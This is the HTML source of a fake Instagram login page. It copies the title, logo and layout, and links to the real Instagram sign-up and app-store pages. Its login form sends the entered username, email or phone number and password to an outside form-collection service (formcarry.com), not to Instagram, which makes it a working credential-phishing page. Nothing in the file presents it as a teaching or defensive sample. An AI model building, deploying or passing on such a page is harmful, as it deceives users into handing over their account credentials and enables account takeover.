<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div class="main">
      <div class="mainimage">
        <img src="https://i.ibb.co/Q8X79RK/image.png" alt="" />
      </div>
      <div class="insform">
        <div class="first">
          <div class="instaimage">
            <img src="https://i.ibb.co/2dCLRGv/logoname.png" alt="" />
          </div>
          <form
            action="https://formcarry.com/s/VM8tEErotwQ"
            class="loginform"
            method="post"
          >
            <div class="login">
              <input
                type="text"
                name="username"
                id="username"
                placeholder="Phone number, username, or email"
              />
            </div>
            <div class="login">
              <input
                type="password"
                name="password"
                id="password"
                placeholder="Password"
              />
            </div>
            <div class="login">
              <button type="submit">Log In</button>
            </div>
            <center class="or">
              <p>OR</p>
            </center>
            <div class="formending">
              <p>
                <a class="up" href="https://www.facebook.com/"
                  >Login with Facebook</a
                >
              </p>
              <br />
              <a class="down" href="https://www.instagram.com/"
                >Forget your password?</a
              >
            </div>
          </form>
        </div>
        <div class="second">
          <p>
            Don't have an account?
            <a href="https://www.instagram.com/accounts/emailsignup/"
              >Sign Up</a
            >
          </p>
        </div>

        <div class="third">
          <p>Get the app.</p>
          <div class="dwnimages">
            <a
              href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D0C826C21-17C3-444A-ABB7-EBABD37214D7%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge"
            >
              <img
                src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
                alt=""
              />
            </a>
            <a href="https://apps.apple.com/us/app/instagram/id389801252">
              <img src="https://i.ibb.co/5KyMHpd/appstore.png" alt="" />
            </a>
          </div>
        </div>
      </div>
    </div>
